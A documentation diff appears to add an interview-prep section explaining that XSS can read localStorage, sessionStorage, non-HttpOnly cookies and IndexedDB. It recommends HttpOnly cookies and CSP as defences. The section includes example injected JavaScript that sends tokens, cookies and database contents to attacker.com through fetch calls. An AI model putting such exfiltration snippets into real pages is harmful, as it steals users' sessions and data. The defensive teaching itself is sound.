@@ -339,6 +339,59 @@ Rules to say in an interview:
 *   **Do not put JWT in localStorage** if you care about XSS. If you must use localStorage for JWT, you shorten lifetime and accept the XSS tradeoff.
 *   **Large or offline** goes in **IndexedDB**. `localStorage` would block the thread and cannot query.
 
+### Security: XSS steals localStorage AND sessionStorage - httpOnly does not
+
+Both Web Storage stores are **JS-readable by design**. If an attacker injects a `<script>` into your origin, that script runs with your origin's permissions and can read both.
+
+```js
+// What the attacker injects - one line is enough, often via
+// unsanitized comment, review, or query param rendered as HTML
+
+// Steal localStorage (persists, shared across tabs)
+fetch("https://attacker.com/steal?l=" + encodeURIComponent(localStorage.getItem("token") ?? ""))
+
+// Steal sessionStorage too - same origin, same XSS, per-tab store
+fetch("https://attacker.com/steal?s=" + encodeURIComponent(sessionStorage.getItem("token") ?? ""))
+
+// Steal non-httpOnly cookies
+fetch("https://attacker.com/steal?c=" + encodeURIComponent(document.cookie))
+
+// Even IndexedDB is readable
+const req = indexedDB.open("shop")
+req.onsuccess = () => {
+  const tx = req.result.transaction("products", "readonly")
+  tx.objectStore("products").getAll().onsuccess = (e) => {
+    fetch("https://attacker.com/steal", { method: "POST", body: JSON.stringify(e.target.result) })
+  }
+}
+
+// What the attacker does NOT get - httpOnly cookie is invisible to JS
+// document.cookie never contains it, localStorage does not contain it
+// Browser still sends it to server, but JS cannot read it
+console.log(document.cookie) // "theme=dark" — no session=... if it was HttpOnly
+```
+
+Why people say localStorage is worse: not because sessionStorage is XSS-proof, it is not. While the tab is open and the injected script runs, **both leak equally**. The difference is **exposure window**: `localStorage` lives across tabs for days, `sessionStorage` dies when the tab closes and is per-tab. A second tab does not share it, so the blast radius is smaller. But in the compromised tab, both are gone.
+
+<div style={{display: 'flex', justifyContent: 'center'}}>
+
+```mermaid
+graph TD
+  INJECT["Attacker injects &lt;script&gt;<br/>runs in your origin"] --> READ{"What can JS read?"}
+  READ -->|"localStorage.getItem"| LEAK1["Leaks -<br/>persists, shared"]
+  READ -->|"sessionStorage.getItem"| LEAK2["Leaks too -<br/>per-tab, until close"]
+  READ -->|"document.cookie"| LEAK3["Leaks if not HttpOnly"]
+  READ -->|"document.cookie<br/>HttpOnly"| SAFE["Blocked -<br/>JS cannot see"]
+  READ -->|"IndexedDB open"| LEAK4["Leaks -<br/>JS can open"]
+  style SAFE fill:#e8f5e9,stroke:#333
+  style LEAK1 fill:#ffcccc,stroke:#333
+  style LEAK2 fill:#ffcccc,stroke:#333
+```
+
+</div>
+
+Defense is the same for both: do not put secrets in any JS-readable store. Put auth in `HttpOnly + Secure + SameSite=Lax` cookie, then stop XSS from running at all with **CSP** (`Content-Security-Policy: script-src 'self'`), input sanitization, and output escaping. Short-lived tokens and rotation limit what a stolen value can do, but they do not stop the steal.
+
 <div style={{display: 'flex', justifyContent: 'center'}}>
 
 ```mermaid
